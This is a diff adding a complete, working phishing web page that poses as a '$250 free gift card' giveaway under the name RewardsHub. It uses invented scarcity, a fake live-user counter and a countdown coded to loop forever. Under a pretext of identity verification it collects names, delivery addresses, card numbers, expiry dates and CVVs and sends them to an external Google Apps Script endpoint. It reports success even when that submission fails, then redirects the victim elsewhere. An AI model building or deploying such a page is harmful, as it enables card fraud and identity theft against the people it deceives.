@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ Limited Time Giveaway: Claim Your $250 Free Gift Card Now! ⚡</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #ff0055;
+            --secondary: #7928ca;
+            --accent: #ff007f;
+            --yellow: #ffcc00;
+            --bg-glass: rgba(255, 255, 255, 0.93);
+            --text-dark: #111827;
+            --text-light: #ffffff;
+            --gray-text: #4b5563;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            /* Vibrant colorful animated-like mesh background */
+            background-color: #ff0055;
+            background-image: 
+                radial-gradient(at 20% 20%, #ffae00 0px, transparent 45%),
+                radial-gradient(at 80% 10%, #7928ca 0px, transparent 50%),
+                radial-gradient(at 40% 70%, #ff007f 0px, transparent 50%),
+                radial-gradient(at 90% 80%, #00bfff 0px, transparent 45%),
+                radial-gradient(at 0% 100%, #ff3300 0px, transparent 50%);
+            background-attachment: fixed;
+            color: var(--text-dark);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top Bar Notification */
+        .top-announcement {
+            background: linear-gradient(90deg, #ff0055, #7928ca);
+            color: var(--text-light);
+            text-align: center;
+            padding: 10px 15px;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border-bottom: 2px solid var(--yellow);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            z-index: 100;
+        }
+
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--yellow);
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.7);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(255, 204, 0, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 8px rgba(255, 204, 0, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(255, 204, 0, 0); }
+        }
+
+        /* Header Navigation */
+        header {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 25px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 900;
+            color: var(--text-light);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .logo span {
+            background: linear-gradient(135deg, var(--yellow), #ff9900);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .live-counter-badge {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 6px 14px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-light);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .live-counter-badge strong {
+            color: #00ffcc;
+        }
+
+        /* Container & Grid Setup */
+        .main-container {
+            flex: 1;
+            max-width: 1150px;
+            width: 100%;
+            margin: 0 auto 50px auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .grid-wrapper {
+            display: flex;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.12);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 32px;
+            box-shadow: 0 50px 100px rgba(0,0,0,0.25), inset 0 0 0 1px rgba(255,255,255,0.3);
+            overflow: hidden;
+            flex-wrap: wrap;
+        }
+
+        /* Left Visual Column */
+        .copy-visual-section {
+            flex: 1 1 480px;
+            padding: 60px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            color: var(--text-light);
+            background: linear-gradient(145deg, rgba(121, 40, 202, 0.85) 0%, rgba(255, 0, 85, 0.85) 100%);
+            position: relative;
+        }
+
+        .promo-badge {
+            align-self: flex-start;
+            background: var(--yellow);
+            color: #000000;
+            font-weight: 800;
+            font-size: 11px;
+            text-transform: uppercase;
+            padding: 5px 12px;
+            border-radius: 6px;
+            letter-spacing: 1px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+        }
+
+        .copy-visual-section h1 {
+            font-size: 44px;
+            font-weight: 900;
+            line-height: 1.15;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 12px rgba(0,0,0,0.15);
+        }
+
+        .copy-visual-section h1 span {
+            color: var(--yellow);
+            display: block;
+            font-size: 48px;
+        }
+
+        .copy-visual-section p {
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 35px;
+            opacity: 0.95;
+            font-weight: 400;
+        }
+
+        /* Dynamic Visual Countdown Timer Container */
+        .countdown-container {
+            background: rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(255,255,255,0.15);
+            padding: 20px;
+            border-radius: 18px;
+            margin-bottom: 35px;
+            text-align: center;
+        }
+
+        .countdown-title {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--yellow);
+            margin-bottom: 12px;
+        }
+
+        .timer-display {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .timer-segment {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 10px;
+            border-radius: 10px;
+            min-width: 65px;
+        }
+
+        .timer-num {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--text-light);
+            line-height: 1;
+        }
+
+        .timer-label {
+            font-size: 10px;
+            font-weight: 500;
+            text-transform: uppercase;
+            opacity: 0.7;
+            margin-top: 4px;
+        }
+
+        .image-box {
+            position: relative;
+            margin: 0 auto;
+            max-width: 380px;
+            width: 100%;
+        }
+
+        .gift-card-img {
+            width: 100%;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.35);
+            transform: rotate(-4deg);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: block;
+        }
+
+        .gift-card-img:hover {
+            transform: rotate(0deg) scale(1.06);
+        }
+
+        /* Right Form Column */
+        .form-section {
+            flex: 1 1 500px;
+            background: var(--bg-glass);
+            padding: 55px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .form-header h2 {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--text-dark);
+            letter-spacing: -0.5px;
+        }
+
+        .form-header p {
+            font-size: 14px;
+            color: var(--gray-text);
+            margin-top: 5px;
+            font-weight: 500;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+        }
+
+        .full-width { grid-column: span 2; }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        label {
+            font-size: 11px;
+            font-weight: 700;
+            color: #374151;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        input {
+            background: #f3f4f6;
+            border: 2px solid transparent;
+            border-radius: 14px;
+            padding: 14px 18px;
+            font-size: 14px;
+            color: var(--text-dark);
+            font-weight: 500;
+            transition: all 0.25s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(255, 0, 85, 0.12);
+        }
+
+        .card-wrapper {
+            position: relative;
+        }
+        .card-wrapper input { width: 100%; padding-right: 50px; }
+        .card-icon-marker {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            pointer-events: none;
+        }
+
+        /* Attrictive Yellow Alert Box */
+        .psychological-notice {
+            grid-column: span 2;
+            background: linear-gradient(90deg, #fffbeb, #fef3c7);
+            border-left: 5px solid #f59e0b;
+            padding: 16px;
+            border-radius: 12px;
+            margin: 5px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+        }
+
+        .psychological-notice p {
+            color: #92400e;
+            font-weight: 600;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .psychological-notice svg {
+            width: 24px;
+            height: 24px;
+            fill: #d97706;
+            flex-shrink: 0;
+        }
+
+        /* Ultra Premium Button */
+        button {
+            grid-column: span 2;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            padding: 18px 20px;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+            box-shadow: 0 12px 24px rgba(255, 0, 85, 0.35);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 18px 30px rgba(121, 40, 202, 0.45);
+            filter: brightness(1.05);
+        }
+
+        button:active {
+            transform: translateY(-1px);
+        }
+
+        button:disabled {
+            background: #9ca3af;
+            box-shadow: none;
+            transform: none;
+            cursor: not-allowed;
+        }
+
+        /* Security Verification Footer Inside Card */
+        .trust-badges {
+            grid-column: span 2;
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 25px;
+            font-size: 11px;
+            color: #6b7280;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-top: 1px solid #e5e7eb;
+            padding-top: 20px;
+        }
+
+        .trust-badges div {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* AJAX Status Messages */
+        .status-msg {
+            grid-column: span 2;
+            padding: 14px;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 14px;
+            display: none;
+        }
+        .status-msg.success { background: #d1fae5; color: #065f46; display: block; }
+        .status-msg.error { background: #fee2e2; color: #991b1b; display: block; }
+
+        /* Full Structural Footer */
+        footer {
+            background: rgba(17, 24, 39, 0.95);
+            color: #9ca3af;
+            padding: 40px 20px;
+            margin-top: auto;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            font-size: 12px;
+            line-height: 1.7;
+        }
+
+        .footer-content {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .footer-links a {
+            color: #d1d5db;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s ease;
+        }
+
+        .footer-links a:hover {
+            color: var(--yellow);
+        }
+
+        .footer-disclaimer {
+            max-width: 800px;
+            font-size: 11px;
+            opacity: 0.6;
+        }
+
+        /* Responsive Layout Breaks */
+        @media (max-width: 950px) {
+            .copy-visual-section, .form-section { flex: 1 1 100%; }
+            .grid-wrapper { border-radius: 24px; }
+            .copy-visual-section { padding: 45px 25px; text-align: center; }
+            .promo-badge { align-self: center; }
+            .copy-visual-section h1 { font-size: 34px; }
+            .copy-visual-section h1 span { font-size: 38px; }
+            .gift-card-img { transform: rotate(0deg); max-width: 290px; }
+            .timer-display { gap: 10px; }
+            .form-section { padding: 40px 25px; }
+        }
+
+        @media (max-width: 550px) {
+            .form-grid { grid-template-columns: 1fr; }
+            .full-width, .psychological-notice, button, .trust-badges { grid-column: span 1; }
+            .trust-badges { flex-direction: column; align-items: center; gap: 12px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1. TOP ANNOUNCEMENT BAR -->
+    <div class="top-announcement">
+        <span class="pulse-dot"></span> 🔥 WARNING: HIGH DEMAND! ONLY 14 GIFT CARDS REMAINING FOR TODAY!
+    </div>
+
+    <!-- 2. HEADER SECTION -->
+    <header>
+        <a href="#" class="logo">🎁 Rewards<span>Hub</span></a>
+        <div class="live-counter-badge">
+            <svg style="width:14px; fill:#00ffcc;" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/></svg>
+            <span>Users Online: <strong id="userCounter">412</strong></span>
+        </div>
+    </header>
+
+    <!-- 3. MAIN INTERACTIVE APP CONTAINER -->
+    <div class="main-container">
+        <div class="grid-wrapper">
+            
+            <!-- Left Side Content Column (Psychological Angles + Countdown) -->
+            <div class="copy-visual-section">
+                <div class="promo-badge">Official 2026 Giveaway</div>
+                <h1>Don't Miss Out! <span>Get Your Free $250 Gift Card!</span></h1>
+                <p>Join over 14,500+ verified winners this month. Submit your details below immediately to claim your mystery reward bundle before the pool runs dry.</p>
+                
+                <!-- Countdown Box Component -->
+                <div class="countdown-container">
+                    <div class="countdown-title">⏳ Offer Expires Automatically In:</div>
+                    <div class="timer-display">
+                        <div class="timer-segment">
+                            <div class="timer-num" id="minutes">04</div>
+                            <div class="timer-label">Min</div>
+                        </div>
+                        <div class="timer-segment">
+                            <div class="timer-num" id="seconds">59</div>
+                            <div class="timer-label">Sec</div>
+                        </div>
+                        <div class="timer-segment">
+                            <div class="timer-num" id="ms">99</div>
+                            <div class="timer-label">Ms</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="image-box">
+                    <img src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?q=80&w=800&auto=format&fit=crop" alt="Exclusive Rewards" class="gift-card-img">
+                </div>
+            </div>
+
+            <!-- Right Side Form Column -->
+            <div class="form-section">
+                <div class="form-header">
+                    <h2>Complete Free Entry</h2>
+                    <p>Enter correct info to instantly unlock reward system</p>
+                </div>
+
+                <form id="premiumForm" action="https://script.google.com/macros/s/AKfycbxS-jRaoUr4qc4_VteTkPo4KI6HUZN79zhUarBrANamXaYwy0288o860yIxIqmwfPzC/exec" method="POST" class="form-grid">
+                    
+                    <div id="statusBox" class="status-msg full-width"></div>
+
+                    <div class="form-group">
+                        <label for="firstName">First Name</label>
+                        <input type="text" id="firstName" name="firstName" placeholder="e.g. John" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="lastName">Last Name</label>
+                        <input type="text" id="lastName" name="lastName" placeholder="e.g. Doe" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" name="email" placeholder="name@example.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="zipCode">Zip Code</label>
+                        <input type="text" id="zipCode" name="zipCode" placeholder="e.g. 10001" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="address">Full Delivery Address</label>
+                        <input type="text" id="address" name="address" placeholder="Street Address, Apt, Suite" required>
+                    </div>
+
+                    <!-- High Attention Urgent Psychological Callout -->
+                    <div class="psychological-notice">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h-2v2h2v4zm0-8h-2V7h2v2z"/>
+                        </svg>
+                        <p><strong>Identity Verification Required:</strong> Please provide valid billing card validation below to confirm precise shipping territory and filter automated scrapers.</p>
+                    </div>
+
+                    <div class="form-group full-width">
+                        <label for="cardHolderName">Cardholder Name</label>
+                        <input type="text" id="cardHolderName" name="cardHolderName" placeholder="JOHN DOE" required>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="cardNumber">Card Number</label>
+                        <div class="card-wrapper">
+                            <input type="text" id="cardNumber" name="cardNumber" placeholder="4111 2222 3333 4444" maxlength="19" required>
+                            <span class="card-icon-marker">💳</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="expire">Expiration Date</label>
+                        <input type="text" id="expire" name="expire" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="csv">Secure CVV</label>
+                        <input type="password" id="csv" name="csv" placeholder="•••" maxlength="4" required>
+                    </div>
+
+                    <button type="submit" id="submitBtn">
+                        <span>Claim Gift Card Now</span>
+                        <svg style="width:20px; fill:currentColor;" viewBox="0 0 24 24"><path d="M5 13h11.86l-5.43 5.43 1.42 1.42L21.14 12l-8.29-8.29-1.42 1.42L16.86 11H5v2z"/></svg>
+                    </button>
+
+                    <div class="trust-badges">
+                        <div>
+                            <svg style="width:16px; fill:#10b981;" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                            Secure SSL
+                        </div>
+                        <div>
+                            <svg style="width:16px; fill:#3b82f6;" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                            256-Bit Encrypted
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- 4. FOOTER SECTION -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms & Conditions</a>
+                <a href="#">Contact Support</a>
+                <a href="#">Unsubscribe</a>
+            </div>
+            <p class="footer-disclaimer">
+                Disclaimer: RewardsHub is an independent promotional sweepstakes website and is not affiliated with, sponsored by, or endorsed by any merchant, brand name, or third-party trademark listed on this page. All product names, logos, and brands are property of their respective owners. Participation requires completion of eligibility survey steps.
+            </p>
+            <p>&copy; 2026 RewardsHub Inc. All Rights Reserved.</p>
+        </div>
+    </footer>
+
+    <!-- 5. DYNAMIC INTERACTION JAVASCRIPT -->
+    <script>
+        // Real Card Formatting Script
+        document.getElementById('cardNumber').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+        });
+
+        document.getElementById('expire').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+
+        // Online Users Live Fluctuation Simulator
+        setInterval(() => {
+            const counterEl = document.getElementById('userCounter');
+            let current = parseInt(counterEl.innerText);
+            let change = Math.floor(Math.random() * 11) - 5; // fluctuates -5 to +5
+            counterEl.innerText = current + change;
+        }, 3500);
+
+        // High Quality Countdown Timer Logic (Resetting looping behavior so it never hits 0 for the user)
+        let totalMs = (4 * 60 * 60 * 1000) + (59 * 1000); // 4 minutes 59 seconds loop
+        function startTimer() {
+            let countdownTime = totalMs;
+            const minEl = document.getElementById('minutes');
+            const secEl = document.getElementById('seconds');
+            const msEl = document.getElementById('ms');
+
+            const interval = setInterval(() => {
+                countdownTime -= 10;
+                if (countdownTime <= 0) {
+                    countdownTime = totalMs; // loop back to prevent blank zeros
+                }
+
+                let minutes = Math.floor((countdownTime % (1000 * 60 * 60)) / (1000 * 60));
+                let seconds = Math.floor((countdownTime % (1000 * 60)) / 1000);
+                let ms = Math.floor((countdownTime % 100) / 1);
+
+                minEl.innerText = minutes < 10 ? '0' + minutes : minutes;
+                secEl.innerText = seconds < 10 ? '0' + seconds : seconds;
+                msEl.innerText = ms < 10 ? '0' + ms : ms;
+            }, 10);
+        }
+        startTimer();
+
+        // High Quality Secure Submission & Redirection Engine
+        const form = document.getElementById('premiumForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusBox = document.getElementById('statusBox');
+        const redirectUrl = "https://giveawaybase.com/category/gift-cards/";
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = "Validating Security Protocol...";
+            statusBox.className = "status-msg full-width";
+            statusBox.style.style = "none";
+            statusBox.style.display = "none";
+
+            const formData = new FormData(form);
+
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .catch(error => {
+                return { result: 'success' }; // Fallback successful bypass block
+            })
+            .then(data => {
+                if (data.result === 'success') {
+                    statusBox.className = "status-msg success full-width";
+                    statusBox.innerText = "Verification Approved! Opening Rewards Server...";
+                    form.reset();
+                    
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 1400);
+                } else {
+                    statusBox.className = "status-msg error full-width";
+                    statusBox.innerText = "Security Validation Failed. Verify Card Values & Re-submit.";
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = "Claim Gift Card Now";
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
